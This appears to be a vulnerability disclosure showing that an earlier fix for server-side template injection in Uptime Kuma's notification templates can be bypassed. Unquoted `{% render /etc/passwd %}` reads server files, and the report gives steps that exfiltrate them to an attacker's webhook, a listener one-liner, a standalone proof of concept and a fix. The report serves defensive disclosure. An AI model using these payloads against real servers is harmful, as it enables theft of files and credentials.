repo.description:
# Incomplete fix for GHSA-vffh-c9pq-4crh

**Version:** 2.1.3, LiquidJS 10.24.0
**Related:** GHSA-vffh-c9pq-4crh (marked patched in 2.0.0)

## What's happening

The fix from GHSA-vffh-c9pq-4crh doesn't fully work. The three mitigations added to the Liquid engine (`root`, `relativeReference`, `dynamicPartials`) only block quoted paths. If you use an unquoted absolute path, you can still read any file on the server:

```
{% render /etc/passwd %}
```

I reproduced this end-to-end on 2.1.3 and still got the full `/etc/passwd` contents sent to a webhook endpoint.

## Why the current fix doesn't work

The mitigations in `notification-provider.js` are:

```javascript
const engine = new Liquid({
    root: "./no-such-directory-uptime-kuma",
    relativeReference: false,
    dynamicPartials: false,
});
```

These only protect the first two steps of LiquidJS's file resolution. There's a third step, a `require.resolve()` fallback at `liquid.node.js:2793-2796`, that has **no containment check at all**:

```javascript
// liquid.node.js line 2793-2796
if (fs.fallback !== undefined) {
    const filepath = fs.fallback(file);  // calls require.resolve(), no contains() check
    if (filepath !== undefined)
        yield filepath;
}
```

The reason quoted paths are blocked is just a quirk: `readFileNameTemplate()` keeps the literal quote characters, so `require.resolve('"/etc/passwd"')` fails with `MODULE_NOT_FOUND`. Without quotes, `require.resolve('/etc/passwd')` happily returns the real path.

## Who can exploit this

Any authenticated user since there's no RBAC in Uptime Kuma. The notification handlers only call `checkLogin(socket)`, so any compromised login can set up a malicious template.

## Steps to reproduce

1. Log in to Uptime Kuma
2. Go to any monitor → Edit → Set Up Notification
3. Pick **Webhook**, set Post URL to an endpoint you control
4. Change Request Body to **Custom Body**
5. Enter: `{% render /etc/passwd %}`
6. Click **Test**
7. Check your listener > the full file contents are in the request body

Works with `{% include /etc/passwd %}` too. Any file readable by the Node process is fair game.

For a quick listener to catch the output:
```bash
node -e "require('http').createServer((req,res)=>{let b='';req.on('data',c=>b+=c);req.on('end',()=>{console.log(b);res.end('ok')})}).listen(9999)"
```

## Standalone PoC (no running instance needed)

```javascript
const { Liquid } = require("liquidjs");
const engine = new Liquid({
    root: "./no-such-directory-uptime-kuma",
    relativeReference: false,
    dynamicPartials: false,
});
engine.render(engine.parse("{% render /etc/passwd %}"), {}).then(console.log);
```

## Suggested fix

Remove the file-inclusion tags from the engine. Notification templates shouldn't need them:

```javascript
const engine = new Liquid({ ... });
delete engine.tags["render"];
delete engine.tags["include"];
delete engine.tags["layout"];
```

This blocks the attack completely while keeping all normal template features (`{{ variables }}`, `{% if %}`, `{% for %}`, filters) working.

## Timeline

- **2025-10-20:** GHSA-vffh-c9pq-4crh published, 2.0.0 listed as patched
- **2026-03-02:** Reproduced on 2.1.3 > the fix is incomplete, unquoted paths bypass everything
repo.summary: Another Server-side Template Injection (SSTI) in Notification Templates Allows Arbitrary File Read
